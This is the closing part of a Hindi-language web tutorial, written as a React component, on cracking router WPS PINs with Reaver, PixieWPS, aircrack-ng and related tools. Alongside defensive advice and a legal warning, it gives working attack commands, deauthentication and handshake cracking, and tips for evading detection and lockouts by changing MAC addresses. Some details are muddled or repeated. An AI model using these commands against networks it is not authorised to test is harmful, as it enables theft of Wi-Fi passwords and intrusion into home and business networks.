        <li><strong className="text-white">लॉग्स चेक करें:</strong> राउटर लॉग्स में बार-बार WPS अटेम्प्ट्स दिखें तो अटैक हो रहा है</li>
        <li><strong className="text-white">रेट लिमिटिंग:</strong> WPS अटेम्प्ट्स की संख्या लिमिट करें (अगर राउटर सपोर्ट करे)</li>
        <li><strong className="text-white">WPA3 यूज़ करें:</strong> नए राउटर्स में WPA3 सपोर्ट है जो WPS को बेहतर तरीके से हैंडल करता है</li>
        <li><strong className="text-white">5GHz बैंड:</strong> बहुत से WPS अटैक्स 2.4GHz पर ही काम करते हैं — 5GHz ज़्यादा सुरक्षित</li>
        <li><strong className="text-white">गेस्ट नेटवर्क:</strong> विज़िटर्स के लिए अलग गेस्ट नेटवर्क बनाएं — WPS उस पर डिसेबल रखें</li>
        <li><strong className="text-white">नेटवर्क सेगमेंटेशन:</strong> क्रिटिकल डिवाइसेस को अलग VLAN में रखो — लैटरल मूवमेंट रोको</li>
        <li><strong className="text-white">रेगुलर ऑडिट:</strong> खुद Wash से अपना राउटर चेक करो — हर महीने करो</li>
        <li><strong className="text-white">लॉग मॉनिटरिंग:</strong> राउटर लॉग्स में WPS अटेम्प्ट्स चेक करो — ELK Stack यूज़ करो</li>
      </ul>
      <CodeBlock
        title="राउटर पर WPS डिसेबल करें"
        code={`# राउटर के वेब इंटरफेस पर जाएं:
# 192.168.1.1 या 192.168.0.1

# Wireless Settings में जाएं:
# WPS → Disable
# या
# WiFi Protected Setup → Off

# कुछ राउटर्स में:
# Advanced Settings → Wireless → WPS → Disabled

# चेक करें कि WPS बंद है:
sudo wash -i wlan0mon
# आपका राउटर लिस्ट में नहीं दिखना चाहिए

# राउटर लॉग्स चेक करें:
# System Logs में "WPS" सर्च करें
# बार-बार WPS attempts दिखें तो अटैक हो रहा है`}
      />

      <h2>Lab Environment Setup</h2>
      <p>
        Reaver प्रैक्टिस के लिए सेफ लैब बनाओ:
      </p>
      <CodeBlock
        title="लैब सेटअप"
        code={`# ज़रूरी सामान:
# 1. पुराना राउटर (WPS सपोर्ट के साथ)
# 2. WiFi एडाप्टर (मॉनिटर मोड सपोर्ट)
# 3. काली लिनक्स/नेटहंटर

# लैब सेटअप:
# 1. पुराना राउटर ऑन करें
# 2. WPS इनेबल करें
# 3. WPA2 पासवर्ड सेट करें (जो आप जानते हो)
# 4. काली से अटैक करें

# प्रैक्टिस स्टेप्स:
# 1. Wash से राउटर ढूंढें
# 2. PixieWPS ट्राई करें
# 3. नॉर्मल Reaver ट्राई करें
# 4. पासवर्ड मिलने पर वेरिफाई करें

# WiFi एडाप्टर रिकमेंडेशन:
# - Alfa AWUS036ACH (सबसे अच्छा)
# - Alfa AWUS036NHA
# - TP-Link TL-WN722N (v1)
# मॉनिटर मोड और पैकेट इंजेक्शन सपोर्ट ज़रूरी है

# वर्चुअल लैब (अगर हार्डवेयर नहीं है):
# - GNS3 में WiFi नेटवर्क सिमुलेट करो
# - वर्चुअल राउटर (hostapd) सेट करो
# - लिनक्स VM में काली इंस्टॉल करो
# - USB WiFi एडाप्टर पास-थ्रू करो

# हार्डवेयर लैब:
# - 3-4 पुराने राउटर्स (अलग-अलग ब्रांड्स)
# - 2 WiFi एडाप्टर्स (अलग-अलग चिपसेट्स)
# - 1 लैपटॉप (काली लिनक्स)
# - 1 डेस्कटॉप (मॉनिटरिंग के लिए)

# राउटर रिकमेंडेशन (लैब के लिए):
# - TP-Link TL-WR841N (WPS सपोर्ट)
# - D-Link DIR-615 (WPS सपोर्ट)
# - Netgear WNR2000 (WPS सपोर्ट)
# - पुराने राउटर्स eBay/OLX से सस्ते मिल जाते हैं`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="एडवांस्ड Reaver टेक्निक्स"
        code={`# स्पेसिफिक PIN रेंज से शुरू करें:
sudo reaver -i wlan0mon -b BSSID -p 12345670
# अगर पहले से कुछ PIN पता है

# मैक एड्रेस बदलें (डिटेक्शन से बचें):
sudo macchanger -r wlan0mon
sudo reaver -i wlan0mon -b BSSID

# डिफ़ॉल्ट PIN ट्राई करें (कुछ राउटर्स के):
# Belkin: 12345670
# D-Link: 12345670
# Netgear: 12345670
# Linksys: 12345670

# ई-कॉमर्स राउटर्स के डिफ़ॉल्ट PIN:
# कुछ राउटर्स का PIN BSSID से कैलकुलेट होता है
# यह बहुत खतरनाक कमज़ोरी है

# Reaver + Aircrack-ng कॉम्बो:
# WPS फेल होने पर हैंडशेक कैप्चर करें:
sudo airodump-ng wlan0mon
sudo aireplay-ng -0 5 -a BSSID wlan0mon
sudo aircrack-ng -w wordlist.txt capture.cap

# डिफ़ॉल्ट PIN जनरेटर (कुछ राउटर्स के):
# BSSID से PIN कैलकुलेट हो सकता है
# यह instant access देता है

# रेट लिमिटिंग बायपास:
# कुछ राउटर्स पर MAC बदलने से लॉक रीसेट होता है
sudo macchanger -r wlan0mon
sudo reaver -i wlan0mon -b BSSID -d 1 -N

# मल्टी-एडाप्टर अटैक:
# 2 WiFi एडाप्टर्स यूज़ करो — एक स्कैन, एक अटैक
sudo wash -i wlan0mon  # स्कैनिंग
sudo reaver -i wlan1mon -b BSSID -vv  # अटैकिंग

# चैनल हॉपिंग बायपास:
# -c फ्लैग से चैनल फिक्स करो
sudo reaver -i wlan0mon -b BSSID -c 6

# डिफ़ॉल्ट PIN लिस्ट:
# कुछ राउटर्स के डिफ़ॉल्ट PIN पब्लिक हैं
# GitHub पर "default wps pin" सर्च करो
# कुछ राउटर्स का PIN मॉडल नंबर से पता चलता है

# WPS PIN कैलकुलेटर:
# कुछ राउटर्स का PIN BSSID से कैलकुलेट होता है
# यह बहुत खतरनाक कमज़ोरी है — instant access`}
      />

      <h2>WPS Protocol Deep Dive</h2>
      <CodeBlock
        title="WPS प्रोटोकॉल विश्लेषण"
        code={`# WPS प्रोटोकॉल कैसे काम करता है:

# 1. Push Button Configuration (PBC):
#    - राउटर और डिवाइस पर बटन दबाओ
#    - 2 मिनट का विंडो
#    - कोई PIN नहीं — सबसे सुरक्षित तरीका

# 2. PIN Method:
#    - 8 डिजिट PIN एंटर करो
#    - यही वल्नरेबल तरीका है
#    - Reaver इसी को ब्रूट फोर्स करता है

# 3. NFC Method:
#    - Near Field Communication से कनेक्ट
#    - बहुत कम डिवाइसेस में है

# PIN Structure:
# 1234 5670
# ^^^^ ^^^^
# |||| |||--- checksum (1 डिजिट)
# |||| ||---- 3 डिजिट random
# |||| |----- last half verification
# ||||------- 4 डिजिट random
# |||-------- first half verification

# WPS Information Elements:
# - Manufacturer
# - Model Name
# - Model Number
# - Device Name
# - Device Password ID
# - UUID
# - Authentication Type Flags

# WPS State Machine:
# - Not Configured (फ़ैक्ट्री डिफ़ॉल्ट)
# - Configured (सेटअप के बाद)
# - Locked (बहुत गलत PIN के बाद)

# WPS Registration Protocol:
# 1. M1: Enrollee Nonce, UUID, MAC Address
# 2. M2: Registrar Nonce, UUID, Enrollee Nonce
# 3. M3: E-Hash1, E-Hash2 (hashed PIN halves)
# 4. M4: R-Hash1, R-Hash2
# 5. M5: E-Nonce, Encrypted Settings
# 6. M6: R-Nonce, Encrypted Settings
# 7. M7: M7D (final verification)
# 8. M8: Network Key (पासवर्ड यहाँ मिलता है!)

# WPS Vulnerability Details:
# - PIN 8 डिजिट का है लेकिन वेरिफिकेशन दो भागों में
# - पहला भाग: 10,000 कॉम्बिनेशन्स (0000-9999)
# - दूसरा भाग: 1,000 कॉम्बिनेशन्स (000-999, checksum)
# - कुल: 11,000 कॉम्बिनेशन्स (10^4 + 10^3)
# - हर अटेम्प्ट: ~10 सेकंड
# - अधिकतम: ~30 घंटे
# - औसत: ~15 घंटे (बिना लॉकआउट)

# PixieWPS Vulnerability:
# - कुछ राउटर्स में PRNG (Pseudo Random Number Generator) कमज़ोर
# - E-Nonce, R-Nonce, E-Hash1, E-Hash2 से PIN कैलकुलेट होता है
# - Ralink/MediaTek चिपसेट सबसे ज़्यादा वल्नरेबल
# - Realtek, Broadcom के कुछ मॉडल्स भी
# - Atheros के कुछ पुराने मॉडल्स`}
      />

      <h2>Real-World Scenarios</h2>
      <div className="space-y-3 mt-4">
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 1: होम WiFi ऑडिट</h4>
          <p className="text-gray-400 text-sm">
            अपने घर के WiFi राउटर का सिक्योरिटी ऑडिट करना। Wash से WPS स्टेटस चेक करो। अगर WPS इनेबल्ड है तो PixieWPS ट्राई करो। अगर वल्नरेबल है तो WPS डिसेबल करो। राउटर लॉग्स में बार-बार WPS अटेम्प्ट्स चेक करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 2: ऑफिस नेटवर्क ऑडिट</h4>
          <p className="text-gray-400 text-sm">
            ऑफिस के सभी WiFi राउटर्स का ऑडिट करना। Wash से सभी WPS इनेबल्ड राउटर्स खोजो। हर राउटर पर PixieWPS ट्राई करो। वल्नरेबल राउटर्स की लिस्ट बनाओ। रिपोर्ट में WPS डिसेबल करने की सिफारिश करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 3: पब्लिक WiFi टेस्टिंग</h4>
          <p className="text-gray-400 text-sm">
            कैफ़े, रेस्टोरेंट, होटल के WiFi का सिक्योरिटी टेस्ट। WPS इनेबल्ड है तो रिस्क है — कोई भी पासवर्ड निकाल सकता है। मैनेजमेंट को बताओ और WPS डिसेबल करने की सलाह दो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 4: IoT डिवाइस टेस्टिंग</h4>
          <p className="text-gray-400 text-sm">
            IoT डिवाइसेज (स्मार्ट कैमरा, स्मार्ट लॉक) जो WiFi से कनेक्ट होते हैं। कई IoT डिवाइसेस WPS यूज़ करते हैं। Reaver से इनका WPS चेक करो। वल्नरेबल होने पर डिवाइस का पासवर्ड मिल सकता है।
          </p>
        </div>
      </div>

      <h2>Common Mistakes</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'बिना मॉनिटर मोड के अटैक करना', a: 'Reaver को मॉनिटर मोड चाहिए — बिना इसके काम नहीं करेगा। airmon-ng start wlan0 से मॉनिटर मोड इनेबल करो।' },
          { q: 'गलत BSSID यूज़ करना', a: 'Wash से सही BSSID कॉपी करो। गलत BSSID से अटैक फेल होगा। MAC एड्रेस डबल-चेक करो।' },
          { q: 'बहुत तेज़ अटैक करना', a: 'बिना डिले के अटैक करने पर लॉकआउट होगा। -d 5 से डिले बढ़ाओ। बैलेंस रखो — बहुत तेज़ या बहुत धीमा दोनों गलत है।' },
          { q: 'PixieWPS फेल होने पर हार मान लेना', a: 'PixieWPS सभी राउटर्स पर काम नहीं करता। नॉर्मल Reaver अटैक ट्राई करो — घंटों लगेंगे लेकिन काम करेगा।' },
          { q: 'चैनल स्पेसिफाई नहीं करना', a: '-c फ्लैग से चैनल स्पेसिफाई करो — चैनल हॉपिंग से बचोगे और स्पीड बढ़ेगी।' },
          { q: 'लॉग सेव नहीं करना', a: '-o फ्लैग से रिजल्ट्स सेव करो। बाद में एनालिसिस और रिपोर्टिंग के लिए ज़रूरी है।' },
          { q: 'राउटर के करीब नहीं होना', a: 'WiFi एडाप्टर टार्गेट के करीब रखो — सिग्नल स्ट्रॉन्ग होना चाहिए (-70 dBm से बेहतर)।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">❌ {item.q}</h4>
            <p className="text-gray-400 text-sm">✅ {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Integration with Other Tools</h2>
      <p>
        Reaver को दूसरे टूल्स के साथ इंटीग्रेट करके पावरफुल WiFi ऑडिट वर्कफ़्लो बनाओ।
      </p>
      <CodeBlock
        title="टूल इंटीग्रेशन"
        code={`#!/bin/bash
# Aircrack-ng + Reaver वर्कफ़्लो

# Step 1: मॉनिटर मोड इनेबल करो
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: टार्गेट्स स्कैन करो
sudo airodump-ng wlan0mon --wps

# Step 3: WPS राउटर्स खोजो
sudo wash -i wlan0mon

# Step 4: PixieWPS ट्राई करो
sudo reaver -i wlan0mon -b BSSID -K 1 -vv

# Step 5: अगर PixieWPS फेल, नॉर्मल Reaver
sudo reaver -i wlan0mon -b BSSID -vv -d 5 -l 300

# Step 6: अगर Reaver भी फेल, हैंडशेक कैप्चर करो
sudo airodump-ng wlan0mon --bssid BSSID -c CHANNEL -w capture
sudo aireplay-ng -0 5 -a BSSID wlan0mon

# Step 7: हैंडशेक क्रैक करो
sudo aircrack-ng -w wordlist.txt capture-01.cap

# Wifite (सब कुछ ऑटो):
sudo wifite --wps-only

# Bully (Reaver का alternative):
sudo bully -b BSSID -c CHANNEL wlan0mon`}
      />

      <h2>Reporting and Documentation</h2>
      <p>
        WiFi सिक्योरिटी ऑडिट की रिपोर्टिंग — कैसे करें।
      </p>
      <CodeBlock
        title="रिपोर्टिंग"
        code={`# Reaver रिजल्ट्स सेव करो:
sudo reaver -i wlan0mon -b BSSID -vv -o results.txt

# Wash स्कैन रिजल्ट्स:
sudo wash -i wlan0mon -o wash_results.txt

# रिजल्ट्स पार्स करो:
# सक्सेसफुल PIN:
grep "WPS PIN" results.txt

# WPA पासवर्ड:
grep "WPA PSK" results.txt

# एग्जीक्यूटिव समरी:
cat > summary.txt << EOF
=== WiFi Security Audit Report ===
Date: $(date)
Target: BSSID (ESSID)
WPS Status: Enabled/Disabled
PixieWPS Result: Vulnerable/Not Vulnerable
Reaver Result: PIN Found/Not Found
WPA Password: Found/Not Found
Recommendation: WPS Disable करें
EOF

# CSV रिपोर्ट:
echo "BSSID,ESSID,WPS,PixieWPS,PIN,Password" > report.csv
echo "AA:BB:CC:DD:EE:FF,HomeWiFi,Yes,Vulnerable,12345670,MyPassword" >> report.csv`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Reaver सभी राउटर्स पर काम करता है?', a: 'नहीं, सिर्फ WPS इनेबल्ड राउटर्स पर। अगर WPS डिसेबल है तो Reaver काम नहीं करेगा। Wash से पहले चेक करें।' },
          { q: 'कितना समय लगता है?', a: 'PixieWPS: सेकंड्स (अगर राउटर वल्नरेबल है)। नॉर्मल Reaver: 4-30 घंटे (लॉकआउट पर डिपेंड)। बिना लॉकआउट: ~15 घंटे औसत।' },
          { q: 'WPS लॉक हो गया तो क्या करें?', a: '15-30 मिनट वेट करें। कुछ राउटर्स 24 घंटे तक लॉक रहते हैं। राउटर रीस्टार्ट करने पर लॉक हट सकता है।' },
          { q: 'PixieWPS और Reaver में क्या फ़र्क है?', a: 'PixieWPS ऑफ़लाइन अटैक है — सेकंड्स में काम करता है (PRNG कमज़ोरी)। Reaver ऑनलाइन ब्रूट फोर्स है — घंटों लगते हैं। पहले PixieWPS ट्राई करें, फिर Reaver।' },
          { q: 'कौन सा WiFi एडाप्टर चाहिए?', a: 'मॉनिटर मोड और पैकेट इंजेक्शन सपोर्ट ज़रूरी है। Alfa AWUS036ACH सबसे अच्छा है। TP-Link TL-WN722N v1 भी अच्छा है। Ralink/Realtek चिपसेट वाले एडाप्टर बेहतर काम करते हैं।' },
          { q: 'मेरा राउटर सेफ है?', a: 'WPS डिसेबल करें → सेफ। अगर WPS इनेबल है तो रिस्क है। राउटर लॉग्स चेक करें — बार-बार WPS अटेम्प्ट्स दिखें तो अटैक हो रहा है।' },
          { q: 'Reaver और Bully में कौन बेहतर है?', a: 'Bully आमतौर पर तेज़ है और बेहतर लॉकआउट हैंडलिंग है। Reaver ज़्यादा पॉपुलर है और ज़्यादा डॉक्यूमेंटेशन है। दोनों ट्राई करें।' },
          { q: 'Android पर Reaver चल सकता है?', a: 'काली नेटहंटर (rooted Android) पर चलता है। बस WiFi एडाप्टर मॉनिटर मोड सपोर्ट करना चाहिए। OTG WiFi एडाप्टर यूज़ करें।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Bully</td><td className="py-2 px-3">WPS PIN ब्रूट फोर्स</td><td className="py-2 px-3">Reaver से तेज़, बेहतर लॉकआउट हैंडलिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PixieWPS</td><td className="py-2 px-3">ऑफ़लाइन WPS PIN क्रैक</td><td className="py-2 px-3">सेकंड्स में PIN, PRNG कमज़ोरी</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Wifite</td><td className="py-2 px-3">ऑटोमेटेड WiFi अटैक</td><td className="py-2 px-3">सब कुछ ऑटो — WPS, WPA, WEP</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Fern WiFi Cracker</td><td className="py-2 px-3">GUI WiFi अटैक टूल</td><td className="py-2 px-3">ग्राफ़िकल इंटरफेस, आसान</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Aircrack-ng</td><td className="py-2 px-3">WPA हैंडशेक क्रैक</td><td className="py-2 px-3">WPS फेल होने पर वैकल्पिक</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">OneShot</td><td className="py-2 px-3">WPS PIN brute force</td><td className="py-2 px-3">Python-based, lightweight</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Airgeddon</td><td className="py-2 px-3">WiFi audit framework</td><td className="py-2 px-3">Multi-attack, menu-driven</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Dumpper</td><td className="py-2 px-3">WPS PIN scanner (Windows)</td><td className="py-2 px-3">Windows-based, GUI</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <br />1. हमेशा पहले PixieWPS (-K 1) ट्राई करो — अगर राउटर वल्नरेबल है तो सेकंड्स में पासवर्ड मिल जाएगा।
        <br />2. अगर PixieWPS फेल हो तो नॉर्मल Reaver चलाओ -d 5 -l 300 के साथ — लॉकआउट से बचने के लिए।
        <br />3. Wash से पहले राउटर का WPS स्टेटस चेक करो — WPS Locked = No वाले राउटर्स पर ही अटैक करो।
        <br />4. WiFi एडाप्टर टार्गेट के करीब रखो — सिग्नल स्ट्रॉन्ग होना चाहिए (-70 dBm से बेहतर)।
        <br />5. चैनल स्पेसिफाई करो (-c) — चैनल हॉपिंग से बचोगे और स्पीड बढ़ेगी।
        <br />6. Reaver के बाद Aircrack-ng से भी हैंडशेक कैप्चर करो — double verification।
        <br />7. अपने राउटर पर WPS डिसेबल करो — यह सबसे ज़रूरी काम है।
        <br />8. WPS M1 messages को Wireshark से कैप्चर करो और प्रोटोकॉल समझो।
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Reaver एक शक्तिशाली WiFi सिक्योरिटी टूल है। इसका इस्तेमाल केवल अपने वाईफाई नेटवर्क पर ही करें। बिना अनुमति के किसी भी वाईफाई नेटवर्क पर WPS अटैक अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। अपने राउटर पर WPS डिसेबल करें — यह सबसे अच्छा बचाव है। शैक्षिक और अधिकृत परीक्षण के अलावा कहीं भी इसका उपयोग न करें। सभी रिजल्ट्स को एन्क्रिप्टेड रखो और अधिकृत लोगों के साथ ही शेयर करो।
      </div>

      <div className="info-box mt-6">
        <strong>💡 अगला कदम:</strong> Reaver से WiFi सिक्योरिटी सीखने के बाद{' '}
        <Link to="/tool/aircrack-ng" className="text-neon-green underline">Aircrack-ng</Link> सेक्शन में जाएं
        और WPA हैंडशेक क्रैकिंग सीखें! Reaver से मिली जानकारी का इस्तेमाल आगे के WiFi अटैक्स में करो।
      </div>

      <div className="info-box mt-6">
        <strong>💡 एक्स्ट्रा टिप्स:</strong>
        <ul className="mt-2 text-gray-400 text-sm space-y-1">
          <li>• हमेशा पहले PixieWPS (-K 1) ट्राई करो — सेकंड्स में पासवर्ड मिल सकता है</li>
          <li>• Wash से पहले राउटर का WPS स्टेटस चेक करो — WPS Locked = No वाले राउटर्स पर ही अटैक करो</li>
          <li>• WiFi एडाप्टर टार्गेट के करीब रखो — सिग्नल स्ट्रॉन्ग होना चाहिए (-70 dBm से बेहतर)</li>
          <li>• चैनल स्पेसिफाई करो (-c) — चैनल हॉपिंग से बचोगे और स्पीड बढ़ेगी</li>
          <li>• भारतीय कॉन्टेक्स्ट: BSNL, Airtel, Jio राउटर्स में WPS अक्सर इनेबल्ड होता है</li>
          <li>• पुराने राउटर्स (2012 से पहले) ज़्यादा वल्नरेबल हैं — नए में लॉकआउट बेहतर है</li>
          <li>• मल्टी-एडाप्टर अटैक: 2 WiFi एडाप्टर्स यूज़ करो — एक स्कैन, एक अटैक</li>
          <li>• डिफ़ॉल्ट PIN लिस्ट चेक करो — GitHub पर "default wps pin" सर्च करो</li>
          <li>• मल्टी-एडाप्टर अटैक: 2 WiFi एडाप्टर्स यूज़ करो — एक स्कैन, एक अटैक</li>
          <li>• चैनल स्पेसिफाई करो (-c) — चैनल हॉपिंग से बचोगे और स्पीड बढ़ेगी</li>
          <li>• भारतीय कॉन्टेक्स्ट: BSNL, Airtel, Jio राउटर्स में WPS अक्सर इनेबल्ड होता है</li>
          <li>• पुराने राउटर्स (2012 से पहले) ज़्यादा वल्नरेबल हैं — नए में लॉकआउट बेहतर है</li>
          <li>• WPS डिसेबल करना सबसे अच्छा बचाव है — राउटर सेटिंग्स में जाओ</li>
          <li>• हमेशा पहले PixieWPS (-K 1) ट्राई करो — सेकंड्स में पासवर्ड मिल सकता है</li>
          <li>• Wash से पहले राउटर का WPS स्टेटस चेक करो — WPS Locked = No वाले राउटर्स पर ही अटैक करो</li>
        </ul>
      </div>

      <h2>WiFi Adapter Selection</h2>
      <p>
        Reaver के लिए सही WiFi एडाप्टर चुनना बहुत ज़रूरी है — सभी एडाप्टर्स मॉनिटर मोड और पैकेट इंजेक्शन सपोर्ट नहीं करते।
      </p>
      <CodeBlock
        title="WiFi एडाप्टर रिकमेंडेशन"
        code={`# सपोर्टेड चिपसेट्स:
# Atheros AR9271 — सबसे अच्छा, Alfa AWUS036NHA
# Ralink RT3070 — अच्छा, Alfa AWUS036NH
# Realtek RTL8812AU — नया, Alfa AWUS036ACH
# Ralink RT5370 — सस्ता, TP-Link TL-WN722N v1

# चेक करो कि एडाप्टर मॉनिटर मोड सपोर्ट करता है:
sudo airmon-ng
# एडाप्टर लिस्ट में दिखना चाहिए

# पैकेट इंजेक्शन टेस्ट:
sudo aireplay-ng -9 wlan0mon
# Injection successful = अच्छा एडाप्टर

# मॉनिटर मोड इनेबल करो:
sudo airmon-ng start wlan0
# या:
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up

# एडाप्टर की कमज़ोरियां:
# - बहुत सस्ते एडाप्टर्स मॉनिटर मोड नहीं करते
# - USB 2.0 एडाप्टर्स धीमे हो सकते हैं
# - कुछ एडाप्टर्स 5GHz सपोर्ट नहीं करते
# - Internal laptop WiFi अक्सर काम नहीं करता

# भारत में उपलब्ध:
# Alfa AWUS036ACH — Amazon/Flipkart पर ~₹2000-3000
# TP-Link TL-WN722N v1 — ~₹500-800 (v1 ज़रूरी है)
# Alfa AWUS036NHA — ~₹1500-2000`}
      />

      <h2>Troubleshooting Guide</h2>
      <p>
        Reaver में आने वाली कॉमन प्रॉब्लम्स और उनके सॉल्यूशंस।
      </p>
      <CodeBlock
        title="ट्रबलशूटिंग"
        code={`# प्रॉब्लम: "Waiting for beacon from BSSID"
# सॉल्यूशन: BSSID गलत है या राउटर रेंज में नहीं
# → Wash से BSSID डबल-चेक करो
# → राउटर के करीब जाओ

# प्रॉब्लम: "WPS transaction failed"
# सॉल्यूशन: राउटर ने WPS रिक्वेस्ट रिजेक्ट कर दिया
# → -N फ्लैग यूज़ करो (NACK handling)
# → -d 5 डिले बढ़ाओ
# → मैक एड्रेस बदलो: sudo macchanger -r wlan0mon

# प्रॉब्लम: "Rate limit exceeded"
# सॉल्यूशन: राउटर ने लॉक कर दिया
# → -l 300 (लॉकआउडेले) यूज़ करो
# → मैक एड्रेस बदलो
# → 5-10 मिनट वेट करो

# प्रॉब्लम: "Interface wlan0mon not found"
# सॉल्यूशन: मॉनिटर मोड इनेबल नहीं है
# → sudo airmon-ng start wlan0
# → या: sudo ip link set wlan0 down && sudo iwconfig wlan0 mode monitor

# प्रॉब्लम: "No wireless interface found"
# सॉल्यूशन: WiFi एडाप्टर डिटेक्ट नहीं हो रहा
# → lsusb या lspci से चेक करो
# → ड्राइवर इंस्टॉल करो
# → USB एडाप्टर दूसरे पोर्ट में लगाओ

# प्रॉब्लम: बहुत धीमा अटैक
# सॉल्यूशन:
# → -d 0 (डिले कम करो) — लेकिन लॉकआउट का रिस्क
# → -x 30 (आइडल टाइम कम करो)
# → -r 3 (रिट्राई कम करो)
# → बेहतर WiFi एडाप्टर यूज़ करो
# → राउटर के करीब जाओ — सिग्नल स्ट्रॉन्ग होना चाहिए
# → चैनल स्पेसिफाई करो (-c) — चैनल हॉपिंग से बचोगे

# प्रॉब्लम: "PixieWPS failed"
# सॉल्यूशन: राउटर PixieWPS vulnerable नहीं है
# → नॉर्मल Reaver अटैक ट्राई करो (घंटों लगेंगे)
# → हैंडशेक कैप्चर करो और Aircrack-ng से क्रैक करो
# → बेहतर वर्डलिस्ट यूज़ करो (rockyou.txt)

# प्रॉब्लम: "Failed to associate with AP"
# सॉल्यूशन: राउटर से एसोसिएट नहीं हो पा रहा
# → -A फ्लैग यूज़ करो (auto-detect)
# → मैक एड्रेस बदलो: sudo macchanger -r wlan0mon
# → राउटर के करीब जाओ
# → एडाप्टर मॉनिटर मोड में है कन्फर्म करो: iwconfig
# → USB एडाप्टर दूसरे पोर्ट में लगाओ
# → ड्राइवर अपडेट करो: apt install firmware-atheros`}
      />
    </TutorialLayout>
  )
}
